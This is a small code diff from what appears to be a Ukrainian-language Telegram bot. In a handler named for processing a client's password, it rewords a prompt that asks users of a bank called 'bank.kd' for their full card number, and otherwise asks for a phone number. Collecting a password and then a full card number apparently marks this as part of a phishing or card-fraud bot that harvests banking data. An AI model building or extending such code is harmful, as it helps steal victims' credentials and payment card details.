@@ -336,7 +336,7 @@ async def process_client_password(message: Message, state: FSMContext):
             bank_name = line_info['bank'].strip().lower()
 
     if bank_name == "bank.kd":
-        await message.answer("Будь ласка, напишіть повний номер Вашої карти (16 цифр)?")
+        await message.answer("Напишіть будь ласка повний номер картки bank.kd")
         await state.set_state(RegistrationStates.waiting_card_number)
     else:
         await message.answer("Будь ласка, напишіть Ваш номер телефону?")
